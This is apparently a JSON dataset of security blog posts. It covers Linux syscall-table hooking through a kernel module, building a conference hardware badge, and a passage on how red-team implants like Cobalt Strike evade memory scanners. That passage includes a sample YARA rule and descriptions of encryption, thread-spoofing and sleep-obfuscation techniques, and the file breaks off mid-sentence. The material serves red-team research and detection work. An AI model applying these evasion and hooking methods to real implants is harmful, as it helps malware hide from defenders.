me to kallsyms, which is a facility used to extract kernel symbols. I found a snippet of code that seemed to do exactly what I needed. Using the kallsyms_lookup_name() function, the kernel module looks up the address of the system call table. By using the address of the table, you can temporarily replace the syscall's definition (after enabling read/write access to the table, courtesy of an answer on Stack Overflow) with your own definition, which in my case just includes a printk to write to the log file when the call is used. I know that I've only scratched the surface of what can be done with this facility, but a deeper investigation can (and hopefully will) happen some other time.\n\nSo, I compiled the module and tried loading it. It compiled successfully (good sign), but trying to load the module gave me a strange error (bad sign):\n\nERROR: modpost: \"kallsyms_lookup_name\" [/home/moth/.../watcher.ko] undefined!\n\nCool. No clue why kallsyms_lookup_name is undefined, but I'll have to look into that.\n\nAfter some additional research, I happened upon an answer. It turns out that since kernel version 5.7.0, the kernel no longer exports that symbol globally. With that knowledge, I now have to find an alternative solution.\n\nKprobes (Redux)\n\nI found an issue on a kernel hacking GitHub repository discussing the same thing I was running into and the folks in the thread hashed out something truly glorious. Remember kprobes and how they weren't immediately useful for this project? Just kidding \u2014 turns out that facility is incredibly useful, just not in a way I had initially expected. One of the things you get back in a kprobe structure is the address, which is where the probe lives in memory. Maybe you can already see where this is going. We can use a kprobe to retrieve the address of the kallsyms_lookup_name() function, because kprobes can see basically any kernel structure. We can then treat the address of that kprobe as the function itself, circumventing the need for the kernel to expose it to us at all.\n\nAll Together Now\n\nThat should be everything needed to make a working proof of concept. Baking the bits of code I found into the module, it can now be used to read/write the syscall table and insert a handler into whatever syscall I want to look at. For now, I've been targeting getuid() as it's relatively simple. In one terminal window, I insert the module with insmod, run the id command (which relies on the getuid() syscall, and then remove the module with rmmod.\n\nLoading Module, Running ID Command, Removing Module\n\nPretty straightforward so far. In another terminal where I have dmesg -wH running, I see the module setup info, including the addresses of kallsyms_lookup_name(), sys_call_table, and the getuid() syscall. The module then sees three getuid() calls before quieting down. A handful of seconds later, I run the id command and the syscall is identified and logged. Another handful of seconds after that, I run rmmod, which results in the remainder of the intercepted syscalls.\n\nSuccessful Syscall Observation\n\nI wasn't immediately sure where the other getuid() calls were coming from, but I eventually realized that it was most likely due to my use of the sudo command to insert or remove the module.\n\nThis seems to work incredibly well and I have ideas for extending it into something more useful for other potential projects. Also, the dmesg output isn't very useful on its own right now, so the next step will be to output register values and any other relevant information I can think of.\n\nConclusion (and Code)\n\nThere's an important caveat I need to make here. The Kprobes facility is a feature which can optionally be disabled. In case it's not enabled, and you are feeling adventurous, you can compile the kernel with the options specified in the Kprobes documentation to make sure you can load modules to play with the facility. Red Hat flavors seem to have the requisite features enabled by default. Your mileage may vary depending on Debian (or any other) flavors.\n\nOverall, this has been a fun exercise and an excellent learning experience. Is it the most useful thing in the world? No. Are there other more robust solutions available? Almost certainly. I think SystemTap would fit the bill nicely. That said, understanding how to hook into the kernel, as well as everything else learned throughout this project, will be invaluable as I work on other projects going forward.\n\nSpeaking of other projects going forward... what's next? Beyond my original goal of deepening my understanding of Linux system calls, I've now found a way to overwrite system calls (as well as other kernel structures) with seemingly anything I want. Beyond simple monitoring, how might I be able to extend (and inevitably break) syscall functionality? Further still beyond the syscall table, what other sorts of kernel structures and memory can I overwrite? And, crucially, what will this do to my poor computer? I didn't expect an evening of tinkering to result in any of this, but I'm excited to see what I can come up with.\n\nAlright, enough of the human words. It's time for some computer words. You can find the module code here if you're interested. Please note the links listed in the comments, as I wouldn't have gotten this far if I hadn't found them.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"So You Want to Build a Conference Hardware Badge!\"\nTaxonomies: \"Author, Fun & Games, How-To, Informational, Ray Felch\"\nCreation Date: \"Thu, 15 Sep 2022 17:05:02 +0000\"\nRay Felch // \n\n2022 BHIS CyMon badge\n\nRecently, it was suggested that it would be cool to create a hardware badge for one of the upcoming InfoSec conferences. Admittedly, I have a pretty solid background in electronic circuit design and software development; however, a conference hardware badge was a relatively new concept to me.  Fortunately for me, I have a son that's been working in the Information Security environment for a number of years and is also an avid collector of conference badges. After checking out some of the badges in his collection and conducting many Google searches, I soon discovered that conference badges can run the gamut from very simple, cool, blinky-light boards to more elaborate, \"CTF\" hackable, printed circuit boards (PCBs).\n\nMany of these badges can take on some pretty unique shapes and interesting silkscreen images in their designs.  A few months ago, I had the opportunity to connect with Jonathan Singer at the B-Sides conference in Tampa. Jonathan took time out from his schedule to talk to me, and he provided me with an add-on board to his 2018 Unofficial DEFCON 26 badge, which he had designed a few years ago. It's reassuring to know that he chose the same PCB fabrication house (PCBWay) that I had been working with.\n\n2018 DEFCON 26 Florida Man badge\n\nOutline\n\nFor this write-up, I have decided to use my first attempt at creating a hardware badge as a process walk-through (as this proved to be a valuable learning experience). I will be highlighting the steps involved in producing the badge from start to finish, including sharing some of the obstacles I needed to overcome. In the process, I will offer some useful tips on electronic circuit design, as well as provide some code development tricks and tools, and helpful information about using the Arduino Uno as a development board.\n\nMoreover, I'll show the process of how to convert the working electronic breadboard circuit to a PCB using a CAD design system, and ultimately build the PCB using one of the many available fabrication manufacturers.  This write-up will show some of the options available and potential problems you might encounter during this phase of the development.\n\nAdditionally, we'll discover some of the options available to us, with regard to building a cost-effective finished product. This might involve outsourcing the CAD design overseas (Pakistan) and fabricating/assembling the PCB in China (PCBWAY, PLCPCB, etc.). These options, while offering lower prices, can introduce long lead-times and can also significantly delay communications between the developer, designer, and manufacturer should questions arise. It wasn't long before I realized just how many moving parts go into creating the badge from start to finish.\n\nFun fact: I quickly learned that, in my time-zone, flipping AM to PM (or PM to AM) and adding an hour gets me the time in China (PCBWAY) right now. Likewise, flipping AM to PM (or PM to AM) and subtracting two hours gets me the time in Pakistan (PCB CAD designer) right now.\n\nElectronic Design Phase\n\nAs one might guess, this is my favorite part of the overall process of building a hardware badge. Before getting started, I needed to come up with a theme for the badge that would be entertaining as well as educational. Obviously, the 'theme' for a conference badge can vary tremendously, but with this being my first journey into uncharted waters, I decided to keep it relatively simple. For my badge, I chose to model the Milton Bradley (now Hasbro) electronic game, \"Simon\", launched in 1978. This popular game generates a sequence of tones and colored lights, which in turn requires the player to repeat the sequence. The sequence grows in size as gameplay continues. As this hardware badge is targeted for an InfoSec audience, I decided to go with the name \"CyMon\", as a play on words.\n\nSoftware Platform\n\nThe past couple of years, I have been doing a great deal of software/hardware development using the Arduino IDE and Arduino Uno development board. Other development platforms exist, and I also experimented with Platform IO using Microsoft Visual Studio. At its core, the Arduino Uno development board uses the Atmel ATMega328P microprocessor and is a very cost-effective 16MHz processor, providing 14 digital input/output pins (6 can be PWM outputs) and 6 analog inputs. There is also a great deal of Arduino-based information on the web, and finding Arduino-based examples of the Simon game was fairly easy to locate.\n\nThe Arduino IDE has a great, easy-to-use GUI (graphical user interface), making it easy to write code and upload to the board. The specifics on how to get started using the Arduino IDE are beyond the scope of this write-up, but suffice it to say, it should be a fairly short learning curve, especially with all of the help of the Arduino community, forums, bloggers, and support on the web.\n\nGetting Started on the Breadboard\n\nNow that we have the theme for the CyMon badge, we can begin gathering the required components to breadboard the circuit. Again, learning how to breadboard could be a write-up of its own, and this write-up assumes the reader has the basic knowledge of how the breadboard is constructed and how to inter-connect the various components.\n\nBased upon the concept of gameplay of the Simon game, we will need 4 different color LEDs (light emitting diodes): blue, green, red, and yellow. We will also need to limit the current through these LEDs with a 330 ohm resistor, so that they don't exceed the LED specs and burn out.\n\nAdditionally, we will need 4 momentary (normally open) switches to capture the user's gameplay selections. Typically, one side of the switch will be pulled high (through a 10k resistor) to Vcc (3.3 volts). The opposite side of the switch will be tied to ground (0 volts). When the button is pressed, the switch closes, changing the signal from 3.3 volts (digital 1) to Ground (digital 0). Note: In order to reduce key-bounce (chatter) we will bypass the switches to ground using a 0.1uF ceramic capacitor.\n\nFor the audio tones, we'll need a piezo (speaker), and for communicating with the user, we'll be using an I2C OLED display. We also will be including 2 more momentary (NO) switches, in addition to the 4 gameplay switches. These two switches will be a reset switch for the processor and a new game (start over) switch, and will require the same 10k resistors and 0.1uF bypass capacitors.\n\nFinally, for the microprocessor circuit, we will need the ATMega328P 28-pin microprocessor, a 16MHz crystal (required for high speed external clocking of the microprocessor), and (2) 22pF bypass capacitors (for clock stability), as well as a toggle (power-on) switch. The breadboard can be powered using a 3.7 volt rechargeable CR2032 button battery, so we'll need a button cell battery holder and a couple of 10uF electrolytic capacitors for the power rails.\n\nComponents\n\n(4) LEDs  blue, green, red and yellow\n\n(4) 330 ohm resistors\n\n(6) tactile momentary (NO) switches\n\n(6) 10k pullup resistors\n\n(1) Piezo (speaker)\n\n(1) OLED display\n\n(1) ATMega328P microprocessor\n\n(2) 22pF ceramic capacitors\n\n(1) 16MHz crystal oscillator\n\n(6) 0.1uF ceramic capacitors\n\n(1) slider DPST toggle switch\n\n(1) button cell battery holder\n\n(2) 10uF Electrolytic capacitors\n\nLooking at the list of components, we should note that most are passive components (typically unaffected by reverse-polarity or voltage issues, etc.). Of the components listed, the microprocessor and OLED display are considered active components. Active components can be severely damaged if wired incorrectly or subjected to high voltage levels that exceed the specified ratings of the device. Likewise, care must be given to the wiring of active components with regard to ensuring Vcc is connected only to the pins marked accordingly. Connecting Vcc directly to a GPIO (general purpose input/output) pin can permanently damage the device. This will become more relevant later in the write-up, when we test our prototype PCBs.\n\nNote: Although resistors, capacitors, and switches are considered passive components and less susceptible to damage, under extreme conditions of high current draw or high voltage levels, any component can be damaged if the circuit is improperly designed. That being said, the circuits described in this write-up are very common configurations that draw very little current and typically operate on 3.3 volts to 5 volts. Obviously, a damaged component at the breadboard stage is going to have less of an impact on the entire build process than would be the case at the prototype testing stage. The former stage simply requires lifting the damaged component from the breadboard and replacing the device, whereas the latter stage requires special surface mount device (SMD) equipment and tools to remove the damaged device. Likewise, applying power to the (latter stage) prototype board without first checking proper orientation of active components can be a major headache (as we will soon see).\n\nHow to Get Help With Individual (Sub-Circuit) Component Designs\n\nDuring the breadboard stage, when designing the hardware badge overall circuit, I found it helpful to do a Google search for ideas on how to implement the various sub-circuits. For example, we could search \"Arduino OLED display DIY\", or \"Arduino piezo DIY\", or \"Arduino momentary switch DIY\", or \"Arduino LED DIY\", etc.\n\nNot only do these search links provide helpful wiring diagrams and great tutorial videos, they typically provide sample sketches (code blocks) that can be uploaded to the Arduino Uno Development board for testing and debugging your code. Once you verify a particular sub-circuit works as you intend it to, you can move the component(s) and its wiring to your main breadboard.\n\nWiring the ATMega328P 28-pin Microprocessor Dual Inline Package (DIP)\n\nA huge step in designing your own electronic circuitry is to learn the details of your Development board's microprocessor, and incorporate that microprocessor on your breadboard. Upon close examination of the Arduino Uno's onboard microprocessor, you will notice it uses a 28-pin DIP package ATMega328P device.\n\nArmed with this knowledge, we can now install the ATMega328P processor on our breadboard and harness much of the capability of the Arduino Uno Development board. The following diagram shows the pin-by-pin wiring of the ATMega328P and its corresponding handful of components (16MHz crystal, 2 - 22pF capacitors, reset momentary switch and 10k resistor). Also shown in this diagram is an LED and corresponding 330 ohm current limiting resistor (as an example). Comparing the two diagrams, we can see that the LED is tied to pin 19 of the processor and the mapping diagram indicates that pin-19 corresponds to GPIO-13 (digital pin D13). Bonus tidbit: Setting GPIO D13 high (3.3v) in the code turns the LED on and setting it low turns the LED off.\n\nNow that we have our breadboard up and running, we can bring pin-2 (RX) and pin-3 (TX)  (and GND) out to an empty spot on the breadboard. These two pins are the serial UART (Universal Asynchronous Receiver/Transmitter) of the processor and, when attached to a TTL-USB adapter, allows for programming the ATMega328P device much in the same manner that we would program the Arduino Uno. As there are many different ways to program the ATMega328P (UART using TTL-USB, SPI using FTDI-USB, USB-ISP, USB-ASP, etc.), these programming steps are better suited for a follow-up write-up.\n\nWith a functioning breadboard 'test-bed', we can write our Simon game code, compile the code, and upload the firmware to the processor for thorough testing and debugging. Writing the code, as well as testing and debugging the code, is an ongoing process in itself. How much time will be expended is directly related to how far you want to go with it, over and beyond what is required to create a functional Simon game.\n\nIn my case, I decided that I wanted to make my hardware badge hackable. I added some code that, using the UART (Universal Asynchronous Receiver/Transmitter) connection, I could connect a TTL-USB adapter, then use a terminal program like minicom and access a shell into the code to uncover a hidden menu with hidden CTF challenges. The UART serial interface allows for two-way communication between the badge and the terminal program. For example, the terminal program can receive any data that the processor might be sending and display it in its console.\n\nAs you might guess, the amount of time you spend on software development is only limited by your imagination and the number of features you want to provide. Of course, there may be time constraints when targeting your badge for a specific conference.\n\nNow would be a good time to consider the printed circuit development phase of the process, as fabrication lead-times can be 25 to 30 days or more. Fortunately for us, we can continue writing and tweaking the code during these long delays in the production process.\n\nCAD Design Phase\n\nComputer-aided design is the use of computers to aid in the creation, modification, analysis, or optimization of a design. This software is used to increase the productivity of the designer, improve the quality of design, improve communications through documentation, and to create a database for manufacturing. (Wikipedia)\n\nThere is quite a selection of CAD software available to choose from. Many are free, many are expensive, and many are somewhere in the middle. In addition, many CAD software systems are geared toward specific applications such as building/housing construction and floor-plan layouts, 3D modeling, printed circuit board design and fabrication, etc. Of course, we're interested in PCB design software and there is an abundance of choices here as well (Altium, Altium 365, Autodesk Fusion 360,  Autodesk EAGLE, KiCad EDA, Ansys RedHawk, EasyEDA, etc.). Back in the mid-80's, I experimented with a package known as Orcad, which still exists today.\n\nLast year, I downloaded the free version of Autodesk's EAGLE and went to work learning their CAD design software. My first project with learning the inner workings of EAGLE was a thru-hole version (no surface mount components) of the Simon game. Although it was a slow process (learning EAGLE as I go), I successfully created the schematic, board layout, and routing. As is the case with all good CAD software, with a click of a button, I was then able to generate the Gerber files, drill hole file, BOM (build of materials) file, and Pick and Place file (picking and placing the SMT components). These files are required by the PCB fabrication company that will be building and assembling the finished PCB product.\n\nIn the case of my experimental 'learning EAGLE' printed circuit board, there was no assembly being done at the fabrication house. I had opted to go with thru-hole rather than surface mount components (for ease of assembly), and ordered 5 boards with no component assembly. The total cost was only $30, with a fabrication build lead-time of only 4 - 5 days. When I received the boards, I soldered the components by hand and soon verified it operated as intended.\n\n2021 CyMon Game\n\nMy experience using the EAGLE software was a rewarding one, however it literally took me weeks to complete this fairly simple design.  One of my biggest obstacles to overcome was learning how to traverse the vast sea of libraries in order to find the correct components for my application. I could only imagine how difficult it would have been had I gone with the low-profile surface mount device (SMD) technology approach. Additionally, learning the various EAGLE command tools also took considerable time to get through. That being said, I'm sure with more time invested, and as new projects materialize, the design process will become easier and completion times will get better.\n\nThis raises an important point worth some consideration. When the hardware badge is intended for a specific conference, and tight deadlines need to be met, I felt that it might be a better option to outsource the CAD design work to a competent professional. This was the case on my first conference hardware badge (CyMon) and the focus of this write-up. I was concerned with the amount of time it would take me to get back up to speed using EAGLE, as it had been close to a year since I had worked with it. Additionally, I wanted to go with low-profile surface mount devices on this version, and that meant searching through new libraries. To complicate things even further, we were talking about an order of 800 PCBs, which completely ruled out any manual assembly of the components.  \n\nFortunately, a colleague (my son) recommended that I check out a website called https://fiverr.com, where professionals of many different fields offer their services and compete with others for your business. In my case, I searched for PCB designers and reached out to a few of them. In the end, I was quoted a price of $80, with 2 revisions and 2-day delivery of the Gerber, Pick and Place, and BOM files. This appeared to be the obvious way to go, considering the tight conference deadlines I was facing.\n\nHiring a PCB designer based in Pakistan, who I found on the FIVERR website, I had the PCB fabrication files in-hand in 2 days as promised. In order to accomplish this, I had to provide him with rough schematic (can even be hand drawn with paper and pencil). The following image illustrates what I created in Microsoft Paint and provided to my designer.\n\nPrinted Circuit Board Fabrication Phase\n\nWith my Gerber zip, BOM, and PnP files in-hand, it was time to reach out to my favorite (at that time) PCB manufacturer, PCBWay in China. I had used this fabrication house a year ago on my simple thru-hole CyMon board and was already familiar with their requirements and their pricing. Of course, I knew that the lead-times and pricing would be greater for this order as I was using low-profile SMD components, and they would be doing the 'pick and place' assembly. Unlike my former PCB order (boards only), this PCB order would be a two-step process. First, they will fabricate the PCBs (4 to 5 day lead time), and then they will assemble the components (25 to 30 day lead time). Likewise, there will be two costs involved.\n\nBonus tidbit: Rather than going with a plain purple board, I discovered that I could choose from a variety of colors for my solder mask (thin lacquer-like layer of polymer that is applied to the copper traces of a printed circuit board for protection against oxidation and to prevent solder bridges). This allows me to 'paint' my board black and place a white silk-screen image of my choosing on the board.\n\nHardware Badges In-Hand \u2014 Testing Phase\n\nSo, a month later and with five prototypes in-hand, it's time to power up a board and watch the magic! WARNING: DO NOT DO THIS!!! Unfortunately, I did that very thing, and not once, but twice! I found out the hard way that PCBWay had installed a batch of processors from Thailand that were incorrectly stamped (pin-1 designation was marked in the wrong corner of the device). Although this is a very rare condition, there have been cases where this has happened, especially with cloned knockoffs. Microchip/Atmel does not recognize the ATMega328P-UTH as a valid certified part, yet we see that part in many products, including Arduino's Pro Micro and Pro Mini production boards.\n\nAs I stated very early in this write-up, \"Active components can be severely damaged if wired incorrectly.\" As the microprocessor (active component) was placed in the wrong orientation due to the incorrect pin-1 markings, applying power to the board placed Vcc voltages on the wrong pins and permanently damaged the device. Thinking this might have been a defective board out-of-the-box, I tried a second board and obtained the same results. So, at this point, I got out my multi-meter and started checking point-to-point connections for continuity. In particular, I checked for continuity between the yellow, blue, red, and green LEDs and D10, D11, D12, and D13 respectively (see schematic above). After some time, I discovered that the D10 - D13 pads were not aligned with the pin numbers according to the ATMega328P pinout. I then determined that if we lift the chip and rotate it counter-clockwise one turn, it will then be aligned correctly.\n\nWith two boards potentially damaged, that left three that might possibly be salvaged. Using a heat gun, another colleague (Rick Wisser) removed the processor(s), cleaned the land areas, and placed the chip (rotated counter-clockwise one turn). This time, when powered on, the OLED display powered on and we were good to go. With three working units, the next step was to program these boards by uploading the software for functional testing.\n\nValuable Lessons Learned\n\nAlways do a quick continuity check of the prototype PCB, especially with regard to the active components. Do this BEFORE POWERING UP THE BOARD for the first time! Unfortunately, we now need a second order of prototypes and we have to do the design and fabrication processes again (another 30 day wait) to ensure proper orientation going forward. After talking with my designer and attempting to understand how this rare chip orientation issue happened, I learned that there are also devices out there with various footprints (pin-1 top-left corner, pin-1 bottom-left corner, etc.). This being the case, we must always be sure to verify the correct position for pin-1 to be sure it coincides with our created board layout during the design phase. Note: As I recall, the fabricator (PCBWAY) did reach out to us via email and ask us to verify the location of pin-1 to ensure proper placement of the processor. The designer confirmed the top-left corner (which apparently was incorrect for that particular footprint).\n\nAfter two shipments of prototype PCBs, and verifying that the programmed boards worked as intended, we were now ready to place a large order of 800 PCBs.\n\nUnfortunately, this resulted in yet another valuable lesson. When choosing our board components, we must always ensure a sufficient in-stock quantity at the build house. In our case, a critical component for our board now showed as 'out of stock' at the build house. We now had three options: swap the component for a compatible device, supply our own parts from a third party source (such as Mouser, Digikey, etc.), or DNP (do not place) the component. In our case there were no compatible components for our part, and after checking with a number of local outlets, we soon discovered that all of the major distributors were also out-of-stock and with a back-order well into next year. Realizing this, we decided to suspend placing our order and put the project on hold for the time being.\n\nLead Times Can Hurt\n\nThroughout this hardware badge project, something became very clear to me. I soon realized that at various stages of development, I found myself waiting on deliveries. I waited on delivery from my CAD designer for the BOM, Gerber, and Pick and Place files (for days at a time). Even more, I waited on my PCB fabricator (build house) in China, averaging a month to receive fully assembled parts in-hand. Additionally, there were frequent email messages from Pakistan and China requesting further information regarding questions that arose. Due to time zone differences, these would result in an additional 1 or 2 days delay.\n\nGoing forward, it became apparent that if I wanted to speed up the process, I needed to address these time consuming roadblocks. This prompted me to revisit learning the CAD software, in an effort to remove the need for outsourcing the design work. This would not only reduce costs, but would also eliminate the delays associated with corresponding with my designer in Pakistan and waiting for my files in-hand. Also, by taking control of the design process, I would be in a better position to correctly answer the many questions that might arise.\n\nFortunately for me, I came across a very user-friendly (and FREE!) CAD design software package called EasyEDA. Thanks to my previous experience with Eagle (now being sold as Fusion 360), I quickly came up to speed with EasyEDA. In no time at all, I had designed a half dozen 'practice' boards (using low profile SMT components) and verified their proper functionality. Also, related to my EasyEDA discovery, I found another PCB fabricator (JLCPCB) that was able to build and assemble my boards in less than half the time of other manufacturers. Doing my own design work meant one time consuming obstacle was now a non-issue!\n\nAddressing the lead times associated with using the build houses in China would be a bit more challenging. It would be worth stating again, that there are actually two lead times associated with building the PCB. The first lead time is generally 3 to 5 days and involves building the bare, printed circuit board with copper routing, silk-screening, solder-masking, etc. (no components assembled). The second, and larger, lead time is typically 25 to 30 days and involves hand soldering any thru-hole components and picking and placing all SMD (surface mount devices), using specialized equipment. Obviously, there would be substantial time savings if we could do our own assembly, not to mention a substantial cost savings (assembly is typically 75% of the total PCB fabrication costs).\n\nWhat is a Pick and Place Machine?\n\nAs the name implies, a Pick and Place (PNP) machine is an automated robotic machine, used to pick up and place or position SMD components on a PCB. It uses a vacuum to lift a component off of a piece of tape, rotate it to the right orientation, and precisely place it on a circuit board. This is accomplished under the control of specialized software, together with our provided PnP files. It can take some time to set up a machine to build the assembly, but once everything is up and running, it can assemble PCBs very quickly.\n\nHigh-end Pick and Place machines used by the major PCB manufacturers can cost tens of thousands of dollars, while used equipment can also come with a huge price tag. Additionally, the software necessary to operate the equipment may be proprietary and could require special licensing or annual subscriptions. At the time of this writing, we are following an open source project (OpenPnP) and considering the purchase of the LumenPnP machine https://opulo.io/products/lumenpnp by Opulo. The cost is a fraction of the higher volume production machines. Shipment is scheduled for the end of the 3rd quarter this year (September 30th).\n\nThe fact that this is an open-source project is a bonus, as we will have the support of the community for future enhancements, and we will not have to be concerned about proprietary software or possible licensing issues.\n\nWe would continue to outsource the fabrication of our bare-boards (3 to 5 day turn-around and very cost effective), but using our own PnP equipment will allow us to assemble our own components and help to significantly reduce the large lead times and higher assembly costs.\n\nSummary\n\nDue to the constantly moving pieces (lead times, manufacturing questions, supply chain costs and availability, etc.), we need to ensure that we provide a sufficient amount of time to complete the badge on time for a targeted conference. At the time of this writing, we are still feeling the effects of the pandemic supply-chain issues. Besides availability issues, one example of this was the increase in price of the ATMega328P-AU microprocessor, which climbed from $2 to $57. Fortunately, the prices are now returning back to normal (down to $21 three months ago) and presently sitting at $4.46.\n\nAs we have seen, the longest turn-around times are PCB fabrication related. Every order of fully assembled prototypes can take a month to receive in-hand.  All changes, modifications, and additions to the existing design (Gerber and Pick and Place files) will require a new set of prototypes to be generated. This results in updated files from the designer (2 to 4 days), and another 25 to 30 day lead time from the PCB fabricator (China), which adds an additional cost to our overall budget.\n\nWhen taking on your hardware badge project and allowing for unforeseen issues, four to six months may appear to be a sufficient amount of time under ideal conditions. However it would always be better to get started a year in advance (whenever possible) of the targeted conference date. Fortunately, these project time allotments can be greatly reduced as we gain more experience, and by identifying and reducing the time consuming obstacles. There's nothing more frustrating than knowing your hardware design is correct and your software works as intended, only to be delayed by out-of-your-control issues that quickly bring that target deadline ever so close.\n\nHopefully, knowing in advance of the potential obstacles and taking the necessary steps to reduce or eliminate them, we can greatly enhance our chances of successfully delivering our finished product ahead of schedule.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Avoiding Memory Scanners\"\nTaxonomies: \"Red Team, Red Team Tools, AceLdr, cobalt strike, evasion, FOLIAGE, gargoyle, Malware, moneta, pe-sieve, yara\"\nCreation Date: \"Thu, 22 Sep 2022 17:48:35 +0000\"\nKyle Avery //\n\nIntroduction\n\nThis post compliments a presentation I gave at DEF CON 30 \u2013 \"Avoiding Memory Scanners: Customizing Malware to Evade YARA, PE-sieve, and More,\" which included the public release of a new tool called AceLdr. The slides for this presentation are available on the conference website.\n\nAs open-source tools and commercial security products improve their ability to scan process memory for malware on Windows, red teams are forced to improve their tradecraft to evade them consistently.\n\nTypically, beaconing C2 implants follow a common paradigm in which the malware executes an instruction and then sleeps for a period. This process presents a set of opportunities for detection and evasion, which this post aims to detail.\n\nMemory Scanner Capabilities\n\nOpen-source memory scanners have varying features that can be defined into the following categories.\n\nPattern Matching\n\nSignature or pattern matching may be the most recognized feature of memory scanners and commercial security products. A prime example of this technique is YARA. YARA can perform string and byte pattern matching with conditional logic. For example, consider the following example rule:\n\nrule Example\n{\n strings:\n $a = \"This program cannot\" xor\n $b = { 41 42 ( 43 | 44 ) ?? 46 }\n\n condition:\n $a or $b\n}\n\nIn this rule, the target must contain one of the following to match:\n\nThe string \"This program cannot\" or any single-byte XOR encrypted variation.\n\nThe bytes 41 and 42, either 43 or 44, any single byte, and 46.\n\nThis simple example should provide a good picture of what is possible with YARA. Anything from simple string or byte patterns to relatively complex combinations of these primitives can be defined.\n\nSince YARA scans all memory allocated by a target process, many projects build off YARA to create more efficient scanners with specific goals. For example, BeaconEye only scans heap memory in search of Cobalt Strike configuration structures which are dynamically allocated at initialization.\n\nCommercial security products like AV and EDR are also known to use YARA. Namely, Carbon Black and CrowdStrike explicitly mention using YARA, and other vendors will likely use it.\n\nA quick Google search can find many YARA rules for Cobalt Strike. For example, the following demonstration scans two cmd.exe processes with a set of rules targeting Cobalt Strike: one benign and one injected with an implant.\n\nDetecting Cobalt Strike with YARA\n\nMemory Attributes\n\nAttributes of memory, such as permissions and mapping information, can also be used to identify potentially malicious code. Memory can be readable, writeable, or executable and mapped as image commit or private commit data. Memory is \"image commit\" if it was created by loading a file from disk such as an EXE or DLL. Memory is \"private commit\" if the process dynamically allocated it through API calls such as VirtualAlloc.\n\nMoneta scans memory pages to look for both executable and private commit memory. All code must be executable, but code on Windows tends to be loaded from disk. Executable private memory occurs legitimately in JIT environments such as the .NET runtime or web browsers. Additionally, Moneta will check the start address of all threads for private commit memory addresses. This check is simple enough to evade, since the start address of a thread is not changed after creation. A new thread with an image commit start address can be created in a suspended state, modified to execute the target shellcode, and resumed.\n\nPE-sieve will scan executable, non-executable, or inaccessible memory for patterns that typically occur in shellcode, depending on the usage. In addition, PE-sieve will check the return address of all threads for private commit memory addresses.\n\nDetecting Cobalt Strike with Moneta and PE-sieve\n\nStack Tracing\n\nFinally, more recent memory scanners have introduced tracing of thread call stacks to identify potentially malicious code. Tools like BeaconHunter and Hunt-Sleeping-Beacons operate on a simple premise: identify any thread with a wait reason of \"DelayExecution\". Since Cobalt Strike and many other implants use the Sleep API call, this method can reliably detect malware implants. Unfortunately, there are often many false positives associated with the technique.\n\nSince the initial release of AceLdr, Hunt-Sleeping-Beacons has been updated with a new method to detect FOLIAGE (more on this in the next section). The scanner now looks for threads with a wait reason of \"UserRequest\", which also have a return address to KiUserApcDispatcher somewhere on their call stack. This will be covered in further detail below.\n\nAn interesting variation of stack tracing can be found in MalMemDetect. This scanner hooks API calls such as RtlAllocateHeap to check the return address at execution time. When Beacon calls one of these APIs, the return address on the stack will point to the implant shellcode, which resides in private commit memory.\n\nDetecting Cobalt Strike with MalMemDetect\n\nThe tools discussed above have capabilities outside this post's scope. I'd recommend looking through the code of each scanner if you're interested in learning more.\n\nBypassing Memory Scanners\n\nDevelopers can take advantage of their C2 implant's sleep period to implement protections that obfuscate the malware to reduce the likelihood that a scanner will detect it. The longer an implant's sleep time, the less likely it will be found by scanners evaded by said protections.\n\nA bypass in the context of this post does not generate false positives. It is not meant to confuse analysts or blend in with existing results. A true bypass results in zero results from a memory scanner before and after an implant is injected.\n\nEncrypting Data\n\nThe first technique that comes to mind for encrypting data is often single-byte XOR. Single-byte XOR is conveniently easy to implement, doesn't require API calls, and runs relatively quickly. Unfortunately, tools like YARA and PE-sieve realized this and found ways to detect this encryption method with ease.\n\nAn alternative solution might implement functions that perform multi-byte XOR, AES, or RC4. However, it will become apparent in the following sections that this is not a viable option either. To completely evade scanners like Moneta, which search for any executable private memory, the code used for encrypting data must reside in image commit memory.\n\nYou can perform AES encryption using Windows APIs, but it requires a combination of multiple API calls to encrypt and decrypt data. An excellent solution for this problem is hinted at in Mimikatz. The author implements SystemFunction032: a system function that can be resolved from advapi32.dll to perform RC4 encryption and decryption. This API call accepts two arguments that contain the target memory and a key, allowing us to dynamically generate a key and encrypt data without executing code in private commit memory. Technically, SystemFunction032 is for encryption, and SystemFunction033 is for decryption. The RC4 cipher is bidirectional, though, so you can use either API for encryption or decryption.\n\nHeap Encryption\n\nNow that we've identified a method of encrypting data, we must decide which data should be encrypted. The beginning of this post referenced BeaconEye, a tool that scans dynamically allocated memory for Cobalt Strike configuration data structures.\n\nHeap encryption is probably best performed in one of two ways:\n\nTracking heap entries created by Beacon\n\nUtilizing a secondary heap for Beacon's allocations\n\nThe official Sleep Mask Kit from Cobalt Strike provides a list of memory addresses for encryption. Their solution is clean, but it requires the use of Sleep Mask Kit, which, as described in the following section, prevents us from bypassing some scanners.\n\nLast year, I released a fork of TitanLdr, which creates a new heap before Beacon is loaded. The GetProcessHeap API is hooked in the implant\u2019s IAT to force it to resolve that heap when resolving the process heap to allocate memory. This allows us to encrypt all entries on the secondary heap, since only the implant should use it. The following demonstration uses this fork to bypass BeaconEye.\n\nAvoiding BeaconEye\n\nObfuscating Executable Code\n\nConsistently bypassing tools like Moneta and PE-sieve requires a combination of encryption to evade pattern matching and memory permission control to evade attribute scanning.\n\nExecutable Masking Stub\n\nAn executable stub such as that used in Sleep Mask Kit or Shellcode Fluctuation can encrypt the implant code at rest and make it non-executable. Both examples require at least one executable region to remain unchanged, though. There will always be at least one point of detection from scanners using the \"masking stub\" technique, and YARA rules can be created to detect the stub itself.\n\nReturn Oriented Programming (ROP)\n\nThe Gargoyle PoC influenced the creation of the other techniques discussed in this section. The author used asynchronous procedure calls to queue and execute a series of ROP gadgets that run while the initiating code is non-executable.\n\nGargoyle is only provided for 32-bit Windows, and the PoC only executes a message box. Earlier this year, Waldo-irc released YouMayPasser: a 64-bit implementation of Gargoyle, ready to use with Cobalt Strike.\n\nRedirecting Execution with Contexts\n\nGargoyle and YouMayPasser achieve our goal of changing the implant code to non-executable. Still, they suffer the same issues as many ROP exploits: different versions of Windows require modifications to the gadget offsets. There are ways to solve this problem, but they can introduce significant complexity.\n\nInspired by Gargoyle, Austin Hudson released FOLIAGE: an alternative to traditional ROP, which uses the NtContinue API call to control execution during sleep. NtContinue is typically used in error handling to restore the execution context of a thread. It accepts 